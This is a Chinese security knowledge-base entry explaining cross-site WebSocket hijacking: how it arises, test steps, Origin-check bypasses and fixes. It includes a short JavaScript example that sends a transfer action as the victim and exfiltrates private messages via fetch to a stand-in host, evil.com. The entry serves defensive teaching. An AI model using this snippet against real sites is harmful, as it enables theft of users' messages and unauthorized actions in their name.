---
id: websocket-security
title: WebSocket 安全（WebSocket Security）
category: 前端与跨站类
severity: medium
owasp: A01:2021-Broken Access Control
cwe: CWE-1385
tags: [websocket, cswsh, frontend, origin]
---

> 本条目仅用于授权安全测试与防御学习。请勿对未授权目标使用文中技术。

# WebSocket 安全（WebSocket Security）

## 一句话
> WebSocket 握手是 HTTP、连接是长久的——**Cookie 自动附带 + 不受同源策略限制 + 常被忘在鉴权体系外**，三者叠加让「跨站 WebSocket 劫持（CSWSH）」成为 CSRF 的长连接版本。

## 它是怎么发生的
WebSocket 建立时发送 HTTP Upgrade 请求，**浏览器自动附带目标的 Cookie**；而握手请求**不受 CORS 预检约束**（WS 不属于 CORS 管辖）——若服务端不校验 `Origin` 头，任意网站的 JS 都能：

```js
const ws = new WebSocket("wss://target.com/ws");
ws.onopen = () => ws.send('{"action":"transfer","to":"attacker"}');  // 受害者身份执行
ws.onmessage = (m) => fetch("https://evil.com/?data=" + m.data);      // 私有消息外传
```

**与 CSRF 的对照**：CSRF 是「伪造一次请求」，CSWSH 是「打开一条受害者身份的双向长连接」——不仅能发，还能**持续读**响应，且不受 SameSite=Strict 之外多数 CSRF 缓解的完整保护（SameSite=Lax 下 WS 握手作为 GET 请求仍带 Cookie）。

## 攻击场景

### 场景一：CSWSH 读私有消息流
**目标**：聊天/通知/行情类 WS 接口。**思路**：攻击页建立 WS 连接（带受害者 Cookie），监听 onmessage 外传。
**验证**：本地构造攻击页 → 受害者（测试账号）访问 → 攻击端收到其私有消息。

### 场景二：以受害者身份执行操作
**目标**：WS 承载的写操作（下注/撤单/审批）。**思路**：握手后按业务协议发送 action 消息。
**结果**：服务端只认「连接已认证」，不认「操作发起页面是谁」。

### 场景三：CSWSH + 服务端转发链
**目标**：WS 消息触发服务端向内部系统发请求（类似 [SSRF](../40-files-requests/ssrf.md) 的 WS 形态）。

## 怎么发现它（验证三步）
1. **发现**：前端 JS 搜 `new WebSocket`；Burp 的 WebSockets history 视图；响应头 `101 Switching Protocols` + `Upgrade: websocket`；
2. **Origin 校验测试**：用 Burp Repeater 改写握手请求（CSWSH 的本质是握手层漏洞）——把 `Origin` 改为 `https://evil.com`，**握手仍返回 101** = 未校验实锤；
3. **CSWSH PoC**：攻击页 `new WebSocket("wss://target/ws")` 收发消息（测试账号闭环）。
- **真假判断**：Origin 改动后被拒绝（握手 403/断开）= 已防护；「校验了 Referer 但没校验 Origin」= 可绕（Referer 可被 [开放重定向](open-redirect.md)等链路操纵，Origin 不可被 JS 伪造才是强校验）。

## 常见绕过与进阶
- **Origin 子串/后缀校验**：`https://target.com.evil.com` 命中「包含 target.com」的判断——与 [CORS](cors.md) 同族的白名单绕过；
- **Referer 校验绕过**：仅校验 Referer 时经 `noreferrer` 页面、meta 标签或重定向链路操纵；
- **降级与重放**：`ws://` 明文形态的中间人（结合网络位置）；握手 token 重用（非一次性）时重放连接；
- **消息协议层**：握手安全后，action 消息的授权缺失是第二层（对每类 action 独立验证）。

## 怎么修
1. **握手时强校验 Origin**：与该会话的预期来源精确匹配（白名单，非子串）——这是 CSWSH 的核心修复；
2. 连接级鉴权：WS 握手或首条消息携带一次性 token（与 [CSRF](csrf.md) Token 同思路），不以 Cookie 为唯一凭证；
3. 业务消息级授权：每条 action 仍走服务端权限校验（连接认证 ≠ 每消息授权）；
4. 传输必须 `wss://`（TLS）；生产环境对 WS 流量纳入限流与审计。

## 常见误区
- **「SameSite 防 CSRF，WS 也就安全了」**：WS 握手是带 Cookie 的请求，Lax 对顶层导航 GET 的放行 + 部分浏览器实现差异，让它不能作为 WS 的唯一防线；Origin 校验才是。
- **「CORS 配好了就行」**：CORS 只管 HTTP 响应的读取授权，**管不到 WS 握手**——两套体系。
- **「WS 接口在内网不测」**：经受害者浏览器即可远程触达（CSWSH），与内网无关。

## 快速清单
- [ ] 全部 WS 端点枚举（前端搜索 + 101 响应）
- [ ] 握手 Origin 变更测试（101 = 洞）
- [ ] CSWSH PoC 收发验证（测试账号闭环）
- [ ] 每条消息的业务授权抽查

## 关联与参考
- 前置：[HTTP 基础](../00-basics/http-basics.md) · 相邻：[CSRF](csrf.md)（同族：Cookie 自动附带）· [CORS](cors.md)（易混淆的另一套体系）
- 参考：[PortSwigger: WebSocket](https://portswigger.net/web-security/websockets) · [MDN WebSocket](https://developer.mozilla.org/zh-CN/docs/Web/API/WebSockets_API)
